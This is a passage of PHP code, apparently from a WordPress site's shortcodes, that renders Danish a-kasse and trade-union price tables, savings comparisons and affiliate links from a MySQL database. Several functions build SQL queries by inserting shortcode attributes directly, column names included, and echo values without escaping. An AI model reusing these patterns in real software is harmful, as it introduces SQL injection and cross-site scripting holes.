while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'fagforeinger', 'fagforeinger' );
}


function akasse_priser_inkl_fag_simple($atts) {
  $a = shortcode_atts( array(
        "focus" => "",
    ), $atts );
	global $links;
	$focus = $a['focus'];
 ob_start();
  ?>
  <ul>
 <?php
 global $db;
 $get_list = "SELECT * FROM data WHERE fagforening_pris>0 && PRIS_MDR>0 ORDER BY fagforening_pris ASC, prio ASC";
 $result_list = $db->query($get_list);
 $x = 0;
 while ($row_list = mysqli_fetch_array($result_list)) {
   $udbyder_display = $row_list["udbyder_display"];
   $fag_pris = $row_list["fagforening_pris"];
   $a_kasse_pris = $row_list["PRIS_MDR"];
   if($x == 0) {
    $udbyder_display_cheapest = $row_list["udbyder_display"];
    $fag_pris_cheapest = $row_list["fagforening_pris"];
    $a_kasse_pris_cheapest = $row_list["PRIS_MDR"];
   }
   $x++;
   if($focus=="fagforening") {
 ?>
<li><?php echo $udbyder_display; ?>: <?php echo $fag_pris+$a_kasse_pris; ?> kr. per måned (samlet pris)</li>
 <?php } else { ?>
 <li><?php echo $udbyder_display; ?> a-kasse pris inkl fagforening: <?php echo $fag_pris+$a_kasse_pris; ?> kr./md.</li>
 <?php } 
 }
 ?>
 </ul>
 <p>Som du kan se ud fra listen er det lige nu <strong><?php echo $udbyder_display_cheapest ; ?></strong>, som tilbyder den lavest a-kasse pris inklusiv fagforening. Hos <?php echo $udbyder_display_cheapest ; ?> betaler du kun <?php echo $a_kasse_pris_cheapest ; ?> kr./md. for a-kasse og <?php echo $fag_pris_cheapest; ?> kr./md. for fagforening, altså en samlet pris på <strong><?php echo $a_kasse_pris_cheapest+$fag_pris_cheapest; ?> kr./md.</strong></p>
 <?php
 return ob_get_clean();
    }
    global $wp_query;
 if (isset($wp_query->post->ID) ) {
 add_shortcode( 'akasse_priser_inkl_fag_simple', 'akasse_priser_inkl_fag_simple' );
 }

function fagforeninger_students($db) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
  <div class="table-responsive">
    <style>
  .tooltip-inner {
	 width:200px;
  }
  @media (max-width:768px) {
	#fagforeninger_students .tabel-center-middel {
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#fagforeninger_students .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#fagforeninger_students .btn-success {
	position: absolute!important;
	left: 0!important;
	padding-top: 8px!important;
	padding-bottom: 8px!important;
	margin-top: 80px;
	}
   #fagforeninger_students .stack-high{
	padding-bottom: 70px;
    padding-top: 30px;
	}
	#fagforeninger_students .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#fagforeninger_students .hide-small {
		display:none;
	}
	#fagforeninger_students .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}

}
</style>
        <table class="table" style="max-width:650px;position:relative;" id="fagforeninger_students">
<thead>
<th class="tabel-center-middel">Fagforening</th>
<th  class="tabel-center-middel">Pris<br/>studerende</th>
<th  class="tabel-center-middel">Normalpris</th>
<th  class="tabel-center-middel hide-small">Se fordele</th>
</thead>
<tbody>

<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY fagforening_pris ASC, prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
    $udbyder = $row_list["UDBYDER"];
	$samlerabat = $row_list["samlerabat"];
	$udbyder_display = $row_list["udbyder_display"];
	$fag_pris = $row_list["fagforening_pris"];
	$a_kasse_pris = $row_list["PRIS_MDR"];
	$id = $row_list["ID"];
	$fag_student = $row_list["fag_student"];
    $tp = $row_list["TRUSTPILOT_SCORE"];
	$logo = $row_list["logo"];
	if ($fag_pris > 0 && $fag_student!="") {
?>
<tr class="tr-oversigt">
<td class="tabel-center-middel stack-high"><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" data-toggle="tooltip" data-container="body" title="fagforening fra <?php echo $udbyder_display; ?>"/></td>
<td  class="tabel-center-middel stack-high"><?php if ($fag_student == "0") { echo "Gratis"; } else { ?><strong><?php echo $fag_student; ?></strong><span class="denotion"> kr.</span><span class="specs">per md.</span><?php } ?></td>
<td  class="tabel-center-middel stack-high"><strong><?php echo $fag_pris; ?></strong><span class="denotion"> kr.</span><span class="specs">per md.</span></td>
<td  class="tabel-center-middel stack-small">
<span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> SE FORDELE</span>
</td>
</tr>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<tr><td class="lastupdated" colspan="10" >Data senest opdateret: <?php echo $updated; ?></td></tr>
</tbody>
</table>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'fagforeninger_students', 'fagforeninger_students' );
}


 function fagforeinger_clean_list($db) {
 ob_start();
 ?>

 <ul>
<?php
global $db;
$get_list = "SELECT * FROM data WHERE fagforening_pris>0 ORDER BY fagforening_pris ASC, prio ASC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

    $udbyder = $row_list["UDBYDER"];
	$udbyder_display = $row_list["udbyder_display"];
	$fag_pris = $row_list["fagforening_pris"];
?>
<li><?php echo $udbyder_display; ?> | <?php echo $fag_pris; ?> kr./md.</li>
<?php
}
?>
</ul>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<p style="font-size:14px">Data i listen ovenfor er senest opdateret <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'fagforeinger_clean_list', 'fagforeinger_clean_list' );
}


function video_fastload($videoid, $videoimg_path, $alt = "a-kasse video") {
ob_start();
?>
         <style>
    .video-container img {
        bottom: 0;
        display: block;
        left: 0;
        margin: auto;
        max-width: 100%;
        width: 100%;
        position: absolute;
        right: 0;
        top: 0;
        border: none;
        height: auto;
        cursor: pointer;
        -webkit-transition: .4s all;
        -moz-transition: .4s all;
        transition: .4s all;
    }
    .video-container img:hover {
        -webkit-filter: brightness(75%);
    }
    .video-container .play {
        height: 72px;
        width: 72px;
        left: 50%;
        top: 50%;
        margin-left: -36px;
        margin-top: -36px;
        position: absolute;
        background: url("/images/play-video-fastload.png") no-repeat;
        cursor: pointer;
    }
</style>
        <script>
		$(document).ready(function(){
         $('#replace').click(
				function labnolIframe() {
                var iframe = document.createElement("iframe");
                var embed = "https://www.youtube.com/embed/<?php echo $videoid; ?>?rel=0&amp;showinfo=0&autoplay=1";
                iframe.setAttribute("src", embed.replace("ID", this.dataset.id));
                iframe.setAttribute("frameborder", "0");
                iframe.setAttribute("allowfullscreen", "1");
                this.parentNode.replaceChild(iframe, this);
            }
		);
		});
        </script>
        <div class="video-container" ><div id="replace"><img src="<?php echo $videoimg_path; ?>" alt="<?php echo $alt; ?>"><div class="play"></div></div></div>

<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'video_fastload', 'video_fastload' );
}

function general_info($atts) {
 ob_start();
     $a = shortcode_atts( array(
        "get_this" => "",
        "year" => "",
    ), $atts );
	global $get_this;
	$get_this = $a['get_this'];
  $year = $a['year'];
  if (empty($year)) {
    $year = "current";
  }
	global $db;
$get_list = "SELECT $get_this FROM general_stats WHERE year='$year'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
  if (strpos($row_list[$get_this], ',') !== false) {
    $result = $row_list[$get_this];
} else {
  $result = number_format($row_list[$get_this],0,',','.');
}
	echo $result;
}
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'general_info', 'general_info' );
}

function udbyder_pris_inline($atts) {
 ob_start();
     $a = shortcode_atts( array(
        "udbyder" => "",
		"cta" => "",
    ), $atts );
	global $udbyder;
	global $cta;
	$udbyder = $a['udbyder'];
	$cta = $a['cta'];
 ?>
<?php
global $db;
$current_url = $_SERVER["REQUEST_URI"];
$get_list = "SELECT * FROM data WHERE UDBYDER='$udbyder'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
    $affiliate_url = $row_list['AFFILIATE_URL'];
    $udbyder = $row_list['UDBYDER'];
   	$id = $row_list["ID"];
    $udbyder_display = $row_list["udbyder_display"];
  	$pris = $row_list['PRIS_MDR'];
    $active = $row_list['ACTIVE'];
    $base_url_internal = $row_list['base_url_internal'];
?>
<span> <?php echo $pris; ?>,-/md. 
<?php if ($cta == 'true' && $current_url != $affiliate_url) { ?>
<?php if ($active == "1") { ?>
  <span class="udbyder_pris_inline"><span class="glyphicon glyphicon-info-sign" style="color:#3498db;margin-right:5px;"></span>
  <span style="color: #333;font-weight:normal;cursor:pointer" onclick="go_udbyder('<?php echo $id; ?>');">Læs mere om <?phpecho $udbyder_display; ?></span>
  </span>
<?php } elseif ($current_url != $base_url_internal) { ?>
  <span class="udbyder_pris_inline"><span class="glyphicon glyphicon-info-sign" style="color:#3498db;margin-right:5px;"></span>
  <a href="<?php echo $base_url_internal; ?>" style="color: #333;font-weight:normal;">Læs mere om <?php echo $udbyder_display; ?></a>
  </span>
<?php }  } ?>
</span>
<?php
}
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udbyder_pris_inline', 'udbyder_pris_inline' );
}

function udbyder_fagforening_pris_inline($atts) {
 ob_start();
     $a = shortcode_atts( array(
        "udbyder" => "",
		"cta" => "",
    ), $atts );
	global $udbyder;
	global $cta;
	$udbyder = $a['udbyder'];
	$cta = $a['cta'];
 ?>
<?php
$current_url = $_SERVER["REQUEST_URI"];
global $db;
$get_list = "SELECT * FROM data WHERE UDBYDER='$udbyder'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
  $affiliate_url = $row_list['AFFILIATE_URL'];
  $udbyder = $row_list['UDBYDER'];
	$id = $row_list["ID"];
	$udbyder_display = $row_list["udbyder_display"];
	$pris = $row_list['fagforening_pris'];
  $active = $row_list['ACTIVE'];
  $base_url_internal = $row_list['base_url_internal'];
?>
<span> <?php echo $pris; ?>,-/md. <?php if ($cta == 'true' && $current_url != $affiliate_url) { ?><span class="udbyder_pris_inline"><span class="glyphicon glyphicon-info-sign" style="color:#3498db;margin-right:5px;"></span>
<?php if ($active == "1") { ?>
<span style="color: #333;font-weight:normal;cursor:pointer" onclick="go_udbyder('<?php echo $id; ?>');">Læs mere om <?php echo $udbyder_display; ?></span>
<?php } else { ?>
<a href="<?php echo $base_url_internal; ?>" style="color: #333;font-weight: normal;">Læs mere om <?php echo $udbyder_display; ?></a>
<?php } ?>
</span><?php } ?></span>
<?php
}
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udbyder_fagforening_pris_inline', 'udbyder_fagforening_pris_inline' );
}

function udbyder_info_inline($atts) {
 ob_start();
     $a = shortcode_atts( array(
        "udbyder" => "",
		"info" => "",
    ), $atts );
	global $udbyder;
	global $cta;
	$udbyder = $a['udbyder'];
	$info = $a['info'];
 ?>
<?php
global $db;
$get_list = "SELECT $info FROM data WHERE UDBYDER='$udbyder'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
	$result = $row_list[$info];
	echo $result;
}
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udbyder_info_inline', 'udbyder_info_inline' );
}

function udbyder_link($atts) {
 ob_start();
     $a = shortcode_atts( array(
        "udbyder" => "",
		"link_text" => "",
    ), $atts );
	$udbyder = $a['udbyder'];
	$link_text = $a['link_text'];
 ?>
<?php
global $db;
$get_list = "SELECT * FROM data WHERE UDBYDER='$udbyder'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
	$affiliate_url = $row_list['AFFILIATE_URL'];
  $base_url_internal = $row_list['base_url_internal'];
  $active = $row_list['ACTIVE'];
	$id = $row_list["ID"];
} ?>
<?php if ($active == "1") { ?>
<span style="color:#428bca;cursor:pointer" onclick="go_udbyder('<?php echo $id; ?>');"><?php echo $link_text; ?></span>
<?php } else { ?>
<a href="<?php echo $base_url_internal; ?>"><?php echo $link_text; ?></a>
<?php }
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udbyder_link', 'udbyder_link' );
}


function udbyder_cta_button($atts) {
 ob_start();
     $a = shortcode_atts( array(
    "udbyder" => "",
		"link_text" => "",
    ), $atts );
	$udbyder = $a['udbyder'];
	$link_text = $a['link_text'];
 ?>
<?php
global $db;
$get_list = "SELECT * FROM data WHERE UDBYDER='$udbyder'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
	$affiliate_url = $row_list['AFFILIATE_URL'];
  $udbyder_display = $row_list['udbyder_display'];
  $active = $row_list['ACTIVE'];
	$id = $row_list["ID"];
} ?>
<?php if ($active == "1") { ?>
<span class="btn btn-block btn-primary btn-success" style="font-weight:600; max-width: 350px;" onclick="go_udbyder('<?php echo $id; ?>');"><?php echo $link_text; ?> <span class="glyphicon glyphicon-circle-arrow-right"></span></span>
<?php }
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'udbyder_cta_button', 'udbyder_cta_button' );
}


function spar_test_wp($atts) {
 ob_start();
  $a = shortcode_atts( array(
        "valgt_akasse" => "",
		"exclude" => "",
		"fag_primary" => "",
		"no_pre_select" => "false",
    ), $atts );
	global $valgt_akasse;
	$valgt_akasse = $a['valgt_akasse'];
	$fag_primary = $a['fag_primary'];
	$no_pre_select = $a['no_pre_select'];
	$exclude = $a['exclude'];
 global $db;
 $get_list_valgt = "SELECT * FROM data WHERE UDBYDER='$valgt_akasse'";
 $result_list_valgt = $db->query($get_list_valgt);
 while ($row_list_valgt = mysqli_fetch_array($result_list_valgt)) {
	$valgt_akasse_pris_mdr = $row_list_valgt["PRIS_MDR"];
	$valgt_akasse_display = $row_list_valgt["udbyder_display"];
	$valgt_akasse_fag_pris_mdr = $row_list_valgt["fagforening_pris"];
	// samlerabat medregning fungerer kun for valgte a-kasser, og kan pt. ikke medregnes på de sammlignede a-kasser. Dette bruges bla. på lederne
	$valgt_akasse_samlerabat_mdr = $row_list_valgt["samlerabat"];
	$valgt_akasse_samlerabat_year = $valgt_akasse_samlerabat_mdr*12;
 }
 ?>
 <script>
function getsaved(valgt_akasse,exclude,fag_primary) {
				  $.ajax({
					type: "GET",
					dataType: "html",
					url: "https://www.find-a-kasse-priser.dk/fuld-tabel.php?valgt_akasse=" + valgt_akasse + "&exclude=" + exclude + "&fag_primary=" + fag_primary,
					cache: false,
					success: function(htmldata) {
						$('#saved_list').html(htmldata);
					}
				  });
}
$(document).ready(function() {
	$("#cta-anker").click(function() {
		getsaved($("#valgt_akasse" ).val(), "<?php if(!empty($exclude)) {echo $exclude;} else {echo "na";} ?>", "<?php echo $fag_primary; ?>");
$('#loader-area').html('<div class="getting-data" id="getting-data"><strong>Henter data...</strong><br/><div class="loader"></div></div>');
		setTimeout(function() {
			$('#getting-data').fadeOut('slow');
		}, 1000); // <-- time in milliseconds
       $('html, body').animate({
       		scrollTop: jQuery("#loader-area").offset().top -200
       }, 1000);
	});
})
</script>
<div style="max-width:700px;position:relative" >
 <form class="form-inline" action="#" style="margin-bottom: 20px;">
    <div class="form-group" style="width:100%;">
      <select class="form-control input-md" style="width:100%;border-radius:0px;cursor:pointer;" name="valgt_akasse" id="valgt_akasse">
      <?php if($no_pre_select == "true") { ?>
      <option value="" selected="" disabled="">
      <?php if (empty($fag_primary)) { ?>Vælg din nuværende a-kasse<?php } else { ?>Vælg din nuværende fagforening<?php }?>
      </option>
      <?php } ?>
        <?php
        $get_list = "SELECT * FROM data ORDER BY UDBYDER ASC";
        $result_list = $db->query($get_list);
        while ($row_list = mysqli_fetch_array($result_list)) {
            $udbyder = $row_list["UDBYDER"];
			$udbyder_display = $row_list["udbyder_display"];
			$pris_mdr = $row_list["PRIS_MDR"];
			$fagforening_pris = $row_list["fagforening_pris"];
			if (empty($fag_primary)) {
			if($pris_mdr > 0) {
        ?>
      <option value="<?php echo $row_list["UDBYDER"]; ?>" <?php if($udbyder == $valgt_akasse) { echo "selected";} ?>><?php echo $udbyder_display; ?></option>
      <?php
		}
       } elseif($fagforening_pris>0) { ?>
       <option value="<?php echo $row_list["UDBYDER"]; ?>" <?php if($udbyder == $valgt_akasse) { echo "selected";} ?>><?php echo $udbyder_display; ?></option>
	 <?php
	   }
		}
     ?>
      </select>
    </div>
    <button type="button" class="btn btn-success input-lg full-width-cta-btn" id="cta-anker">SE HVOR MEGET DU KAN SPARE</button>
  </form>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
	  $(document).ajaxComplete(function(){
		 $('[data-toggle="tooltip"]').tooltip();
	  })
</script>
   <div id="loader-area"></div>
    <div class="table-responsive" id="saved_list">
     <style>
  #saved_list .tooltip-inner {
     width:100%;
	 white-space:nowrap;
	 max-width:400px;
	 min-width:280px;
	 text-align:left;
  }
  .table-responsive .tooltip-inner hr {
	 margin-top: 2px;
    margin-bottom: 2px;
	clear:both;
	}
	  .table-responsive .tooltip-inner br {
		  clear:both;
	}
	.table-responsive .tooltip-inner .right {
		float:right;
   }
@media (max-width:768px) {
	#spar_test .tabel-center-middel {
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#spar_test .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
		<?php if(empty($valgt_akasse_pris_mdr)) { // make sure hight of mobile table fits when there is no a-kasse ?>
	   #spar_test .stack-high{
		padding-bottom: 80px!important;
		padding-top: 30px!important;
		}
	    #spar_test .btn-success {
		position: absolute!important;
		left: 0!important;
		padding-top: 8px!important;
		padding-bottom: 8px!important;
		margin-top:15px;
		}
		<?php }  elseif(empty($valgt_akasse_fag_pris_mdr)) { // make sure hight of mobile table fits when there is no fagforening ?>
	   #spar_test .stack-high{
		padding-bottom: 70px!important;
		padding-top: 15px!important;
		}
	    #spar_test .btn-success {
		position: absolute!important;
		left: 0!important;
		padding-top: 8px!important;
		padding-bottom: 8px!important;
		margin-top:5px;
		}
		#spar_test .stack-small {
		padding-top: 15px!important;
		}
	 	 <?php } else {  // if both a-kasse and fagforening is present then ?>
	   #spar_test .stack-high{
		padding-bottom: 110px;
		padding-top: 50px;
		}
		#spar_test .stack-small {
			display:block!important;
			border:none!important;
			padding-bottom: 0px!important;
		}
	   #spar_test .btn-success {
		position: absolute!important;
		left: 0!important;
		padding-top: 8px!important;
		padding-bottom: 8px!important;
		}
		<?php } ?>
	#spar_test .course_ribbon_box {
	    width: 0px;
		position:inherit;
	}
    #spar_test .course_ribbon_box .course_ribbon_box_text {
		position: absolute;
		display: block;
		LEFT: 0px;
		padding: 7px 7px;
		font: 700 9px/1 Lato,sans-serif;
		margin-top: -22px;
		width:100px;
	}
	#loensikring .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#spar_test .hide-small {
		display:none;
	}
	#spar_test .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}

}
</style>
    <?php if(!empty($valgt_akasse)) { ?>
<div class="alert alert-info">
<?php if (empty($fag_primary)) { ?>
 <p>Du har valgt <strong><?php echo $valgt_akasse_display; ?></strong> som din nuværende a-kasse. Hos <?php echo $valgt_akasse_display; ?> betaler du <strong><?php echo $valgt_akasse_pris_mdr; ?> kr. / md.</strong> for a-kasse<?php if($valgt_akasse_fag_pris_mdr>0) {?> og evt. <strong><?php echo $valgt_akasse_fag_pris_mdr; ?> kr. / md.</strong> for fagforening<?php }?>. <?php if ($valgt_akasse_samlerabat_mdr > 0) { ?>Hos <?php echo $valgt_akasse_display; ?> kan du opnå en samlerabat på <strong><?php echo $valgt_akasse_samlerabat_mdr; ?> kr. / md.</strong><?php } ?></p><p>Se nedenfor, <strong>hvor meget du evt. kan spare</strong> ved at skifte til en anden a-kasse<?php if($valgt_akasse_fag_pris_mdr>0) {?> og/eller fagforening<?php }?>.</p><?php if($valgt_akasse_fag_pris_mdr>0) {?><p>I nogle tilfælde kan du spare ved at skifte både a-kasse og fagforening, i andre tilfælde kan det kun betale sig at flytte en af delene.</p><?php }?>
 <?php } else { ?>
  <p>Du har valgt <strong><?php echo $valgt_akasse_display; ?></strong> som din nuværende fagforening. Hos <?php echo $valgt_akasse_display; ?> koster fagforening <strong><?php echo $valgt_akasse_fag_pris_mdr; ?> kr. / md.</strong> <?php if($valgt_akasse_pris_mdr>0) {?> og evt. <strong><?php echo $valgt_akasse_pris_mdr; ?> kr. / md.</strong> for a-kasse<?php }?>. <?php if ($valgt_akasse_samlerabat_mdr > 0) { ?>Hos <?php echo $valgt_akasse_display; ?> kan du opnå en samlerabat på <strong><?php echo $valgt_akasse_samlerabat_mdr; ?> kr. / md.</strong><?php } ?></p><p>Se nedenfor, <strong>hvor meget du evt. kan spare</strong> ved at skifte til en anden fagforening<?php if($valgt_akasse_pris_mdr>0) {?> og/eller a-kasse<?php }?>.</p><?php if($valgt_akasse_fag_pris_mdr>0) {?><p>I nogle tilfælde kan du spare ved at skifte både a-kasse og fagforening, i andre tilfælde kan det kun betale sig at flytte en af delene.</p><?php }?>
 <?php }?>
</div>
<table class="table" id="spar_test">
<thead>
<th class="tabel-center-middel"><?php if (empty($fag_primary)) { echo "A-kasse";} else { echo "Fagforening";}?></th>
<th  class="tabel-center-middel">Pris<br/><span style="font-size:12px;"><?php if (empty($fag_primary)) { echo "A-kasse";} else { echo "Fagforening";}?></span></th>
<?php if($valgt_akasse_pris_mdr>0) {?><th  class="tabel-center-middel hide-small">Besparelse<br/><span style="font-size:12px;">A-kasse</span></th><?php }?>
<?php if($valgt_akasse_fag_pris_mdr>0) {?><th  class="tabel-center-middel hide-small">Besparelse<br/><span style="font-size:12px;">Fagforening</span></th><?php }?>
<?php if($valgt_akasse_fag_pris_mdr>0) {?><th  class="tabel-center-middel hide-small">Besparelse<br/><span style="font-size:12px;">Total / år</span></th><?php }?>
<th class="tabel-center-middel hide-small"></th>
<th class="tabel-center-middel hidden-sm hidden-md hidden-lg">Besparelser<br/><span style="font-size:12px;">Årligt</span></th>
</thead>
<tbody>
<?php
global $db;
$get_list = "SELECT * FROM data WHERE UDBYDER!='$valgt_akasse' AND  UDBYDER!='$exclude' ORDER BY PRIO ASC" ;
$result_list = $db->query($get_list);
$x = 0;
while ($row_list = mysqli_fetch_array($result_list)) {
    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$base_url_internal = $row_list["base_url_internal"];
	$pris_mdr = $row_list["PRIS_MDR"];
	$fagforening_pris = $row_list["fagforening_pris"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	$id = $row_list["ID"];
    $udbyder = $row_list["UDBYDER"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	$recomended = $row_list["recomended"];
	$saved = $valgt_akasse_pris_mdr - $pris_mdr;
	$saved_fag = $valgt_akasse_fag_pris_mdr - $fagforening_pris;
	$saved_year = $saved*12;
	$saved_year_display = number_format($saved_year, 0, ',', '.');
	$saved_year_fag = $saved_fag*12;
	$saved_year_fag_display = number_format($saved_year_fag, 0, ',', '.');
	$saved_year_total = $saved_year_fag + $saved_year;
	if($valgt_akasse_fag_pris_mdr>$fagforening_pris && $valgt_akasse_pris_mdr>$pris_mdr && $fagforening_pris>0 && $valgt_akasse_samlerabat_year > 0) { // hvis den valgte udbyder tilbyder samlerabat (lederne)
		$saved_year_total = $saved_year_fag + $saved_year - $valgt_akasse_samlerabat_year ;
	}
	$saved_year_total_display = number_format($saved_year_total, 0, ',', '.');
	if ($aktiv != 0) {
	++$x;

?>
<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?>  class="tr-oversigt <?php if(!empty($fag_primary) && $fagforening_pris<=0) { ?>hidden<?php } ?>">
<td class="tabel-center-middel stack-high"><img src="<?php echo $logo; ?>" alt="<?php echo $udbyder_display; ?> a-kasse" class="tabel-logos"/><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $udbyder_display; ?></span></td>
<td  class="tabel-center-middel stack-high"><?php if (empty($fag_primary)) { echo $pris_mdr . '<span class="denotion"> kr.</span><span class="specs">per md.</span>'; } elseif($fagforening_pris>0) {echo $fagforening_pris . '<span class="denotion"> kr.</span><span class="specs">per md.</span>';} else { echo '<span style="font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;">Tilbyder ikke<br/>fagforening</span>';}?></td>
<?php if($valgt_akasse_pris_mdr>0) {?>
<?php if($valgt_akasse_pris_mdr>$pris_mdr) {?>
<td  class="tabel-center-middel stack-small">
<b><?php echo $saved_year; ?></b><span class="denotion"> kr.</span><span class="specs">På a-kasse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-html="true" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$valgt_akasse_pris_mdr, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$pris_mdr, 0, ',', '.'); ?></span><hr/><strong>Besparelse a-kasse:</strong> <span class='right'><?php echo $saved_year; ?></span>"></span></span>
</td>
<?php } else {?>
<td  class="tabel-center-middel stack-small"><span style="font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;padding-top:5px;padding-bottom:5px;">Ingen besparelse<br/>på a-kasse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-html="true" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$valgt_akasse_pris_mdr, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $pris_mdr; ?> x 12<span class='right'><?php echo number_format(12*$pris_mdr, 0, ',', '.'); ?></span><hr/><strong>Besparelse a-kasse</strong>: <span class='right'><?php echo $saved_year; ?></span>"></span></span></td>
<?php } ?>
<?php } ?>
<?php if($valgt_akasse_fag_pris_mdr>0) {?>

<?php if($valgt_akasse_fag_pris_mdr>$fagforening_pris && $fagforening_pris>0){?>
<td  class="tabel-center-middel stack-small"><b><?php echo $saved_year_fag_display; ?></b><span class="denotion"> kr.</span><span class="specs">På fagforening <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-html="true" data-toggle="tooltip" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_fag_pris_mdr; ?> x 12<span class='right'><?php echo number_format(($valgt_akasse_fag_pris_mdr)*12, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $fagforening_pris; ?> x 12<span class='right'><?php echo number_format(($fagforening_pris)*12, 0, ',', '.'); ?></span><hr/><strong>Besparelse fagforening</strong>: <span class='right'><?php echo $saved_year_fag_display; ?></span>"></span></span></td>
<?php } else { ?>
<?php if($valgt_akasse_fag_pris_mdr<=$fagforening_pris) {?>
<td  class="tabel-center-middel stack-small"><span style=font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;">Ingen besparelse<br/>på fagforening <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-html="true" data-toggle="tooltip" title="" data-original-title="<strong><?php echo $valgt_akasse_display; ?></strong>: <?php echo $valgt_akasse_fag_pris_mdr; ?> x 12<span class='right'><?php echo number_format(($valgt_akasse_fag_pris_mdr)*12, 0, ',', '.'); ?></span><br/><strong><?php echo $udbyder_display; ?></strong>: <?php echo $fagforening_pris; ?> x 12<span class='right'><?php echo number_format(($fagforening_pris)*12, 0, ',', '.'); ?></span><hr/><strong>Besparelse fagforening:</strong>: <span class='right'><?php echo $saved_year_fag_display; ?></span>"></span></span></td>
<?php }  elseif($fagforening_pris==0) { ?>
<td  class="tabel-center-middel stack-small"><span style="font-size:11px;line-height:15px;display:block;padding-top:5px;padding-bottom:5px;">Tilbyder ikke<br/>fagforening</span></td>
<?php } ?>
<?php } ?>

<?php if($valgt_akasse_fag_pris_mdr<=$fagforening_pris && $valgt_akasse_pris_mdr<=$pris_mdr) {  // a-kasse: ingen besparelse + fagforening: ingen besparelse ?>
